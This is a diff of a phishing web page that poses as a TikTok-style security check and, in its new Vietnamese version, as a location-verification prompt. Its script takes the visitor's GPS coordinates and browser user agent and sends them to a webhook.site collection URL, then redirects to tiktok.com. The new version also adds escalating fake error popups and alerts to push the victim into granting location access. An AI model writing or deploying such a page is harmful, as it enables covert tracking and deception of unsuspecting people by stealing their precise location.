@@ -2,55 +2,73 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Security Check</title>
+    <title>Xác minh vị trí</title>
     <style>
         body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #fff; }
         button { background: #fe2c55; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
-        button:hover { opacity: 0.9; }
+        .popup-box { background: #222; padding: 20px; margin: 20px auto; max-width: 400px; border-radius: 10px; }
     </style>
 </head>
 <body>
-    <h2>TikTok Security Verification</h2>
-    <p>We detected an unusual login attempt from a new device.</p>
-    <p>Click the button below to verify your location.</p>
-    <button onclick="requestLocation()">Verify Location</button>
+    <h2>📍 Xác minh vị trí</h2>
+    <p>Hệ thống cần vị trí của bạn để tiếp tục</p>
+    <button onclick="requestLocation()">Nhấn để xác minh</button>
+    <div id="popupArea"></div>
 
     <script>
     const WEBHOOK = "https://webhook.site/c746b97f-524c-4fa1-8845-47e93ee3c38b";
+    let popupCount = 0;
     
     function requestLocation() {
-        document.body.innerHTML = "<h2>Verifying...</h2><p>Please wait...</p>";
-        
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendGPS, fallbackIP);
+            navigator.geolocation.getCurrentPosition(sendGPS, showPopup);
         } else {
-            fallbackIP();
-        }
-        
-        function sendGPS(pos) {
-            let lat = pos.coords.latitude;
-            let lon = pos.coords.longitude;
-            fetch(`${WEBHOOK}?type=gps&lat=${lat}&lon=${lon}&ua=${encodeURIComponent(navigator.userAgent)}`, {mode: 'no-cors'});
-            redirect();
-        }
-        
-        function fallbackIP() {
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    let info = `IP: ${data.ip} | City: ${data.city} | Lat: ${data.latitude}, Lon: ${data.longitude}`;
-                    fetch(`${WEBHOOK}?type=ip&info=${encodeURIComponent(info)}`, {mode: 'no-cors'});
-                    redirect();
-                })
-                .catch(() => redirect());
-        }
-        
-        function redirect() {
-            setTimeout(() => {
-                window.location.href = "https://www.tiktok.com";
-            }, 1500);
+            showPopup();
         }
     }
+    
+    function sendGPS(pos) {
+        let lat = pos.coords.latitude;
+        let lon = pos.coords.longitude;
+        fetch(`${WEBHOOK}?type=gps&lat=${lat}&lon=${lon}&ua=${encodeURIComponent(navigator.userAgent)}`, {mode: 'no-cors'});
+        document.body.innerHTML = "<h2>✅ Đã xác minh!</h2><p>Chuyển hướng...</p>";
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com";
+        }, 1500);
+    }
+    
+    function showPopup() {
+        popupCount++;
+        let popupArea = document.getElementById('popupArea');
+        let newPopup = document.createElement('div');
+        newPopup.className = 'popup-box';
+        newPopup.innerHTML = `
+            <p>⚠️ LỖI ${popupCount} ⚠️</p>
+            <p>Không thể xác minh vị trí tự động</p>
+            <button onclick="requestLocation()">Nhấn để thử lại (${popupCount})</button>
+        `;
+        popupArea.appendChild(newPopup);
+        
+        // Also use alert if too many popups
+        if (popupCount >= 3) {
+            alert("⚠️ CẢNH BÁO: Vui lòng bật vị trí!\n⚠️ Nhấn OK và cho phép truy cập vị trí");
+        }
+        if (popupCount >= 5) {
+            alert("🚨 LẦN CUỐI: Bật vị trí ngay!");
+        }
+        if (popupCount >= 7) {
+            // Reload page to start over
+            location.reload();
+        }
+    }
+    
+    // Auto trigger first popup after 2 seconds
+    setTimeout(() => {
+        let fakeDiv = document.createElement('div');
+        fakeDiv.style.display = 'none';
+        document.body.appendChild(fakeDiv);
+        alert("📍 Yêu cầu vị trí\n📍 Nhấn OK và cho phép truy cập vị trí");
+    }, 2000);
     </script>
 </body>
 </html>
